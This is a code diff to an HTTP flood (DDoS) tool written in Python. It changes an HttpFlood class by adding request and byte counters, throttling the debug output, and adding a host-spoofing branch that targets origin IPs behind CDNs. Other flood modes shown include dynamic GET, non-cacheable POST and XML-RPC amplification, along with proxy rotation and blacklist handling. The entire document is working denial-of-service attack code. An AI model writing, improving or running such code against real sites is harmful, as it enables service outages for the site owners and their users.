@@ -1245,9 +1245,8 @@ class HttpFlood(Thread):
         s = None
         try:
             s = self.open_connection()
-            global CONNECTIONS_SENT
+            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
             CONNECTIONS_SENT += 1
-            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: High-Load Packet Sent to {self._target.authority}")
 
             for _ in range(self._rpc):
                 # [OPTIMIZED] Dynamic Path
@@ -1279,7 +1278,11 @@ class HttpFlood(Thread):
                     if "Blocked" in str(e): raise e
                     pass
                 
-                Tools.send(s, payload.encode("utf-8"))
+                if Tools.send(s, payload.encode("utf-8")):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
+                    if int(REQUESTS_SENT) < 50:
+                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: Packet Sent to {self._target.authority}")
         except Exception as e:
             pass
         Tools.safe_close(s)
@@ -1483,7 +1486,12 @@ class HttpFlood(Thread):
         headers = self.build_consistent_headers(ua)
         
         request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
-        host_header = f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
+        # [PHASE 15] DYN Host Logic: Disable random subdomains if Host Spoofing is active
+        # Origin IPs usually don't support wildcard virtual hosts.
+        if hasattr(self, '_raw_target') and self._raw_target[0] != self._target.host:
+             host_header = f"Host: {self._target.authority}\r\n"
+        else:
+             host_header = f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
         
         payload: Any = (f"{request_line}"
                         f"{host_header}"
@@ -1495,11 +1503,12 @@ class HttpFlood(Thread):
             s = self.open_connection()
             global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
             CONNECTIONS_SENT += 1
-            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
             for _ in range(self._rpc):
                 if Tools.send(s, payload):
                     REQUESTS_SENT += 1
                     BYTES_SEND += len(payload)
+                    if int(REQUESTS_SENT) < 50:
+                        print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
                     # [NEW] Status Tracker (Sniffer) + Auto Reconnect + Blacklist
                     # [PHASE 13] Smarter Sniffer (Non-Blocking)
                     try:
@@ -1548,11 +1557,12 @@ class HttpFlood(Thread):
             s = self.open_connection()
             global CONNECTIONS_SENT, BURNED_PROXIES, REQUESTS_SENT, BYTES_SEND
             CONNECTIONS_SENT += 1
-            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Non-Cacheable Packet Sent")
             for _ in range(self._rpc):
                 if Tools.send(s, payload):
                     REQUESTS_SENT += 1
                     BYTES_SEND += len(payload)
+                    if int(REQUESTS_SENT) < 50:
+                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Packet Sent")
                     # Status Sniffer
                     # [PHASE 13] Smarter Sniffer (Non-Blocking)
                     try:
@@ -2022,12 +2032,13 @@ class HttpFlood(Thread):
             # Increment Global Counter
             global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
             CONNECTIONS_SENT += 1
-            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Amplification Packet Sent to {self._target.authority}")
             
             for _ in range(self._rpc):
                 if Tools.send(s, post_payload):
                     REQUESTS_SENT += 1
                     BYTES_SEND += len(post_payload)
+                    if int(REQUESTS_SENT) < 50:
+                        print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Packet Sent to {self._target.authority}")
                     # Simple sniffer
                     try:
                         response_start = s.recv(20).decode('utf-8', errors='ignore')
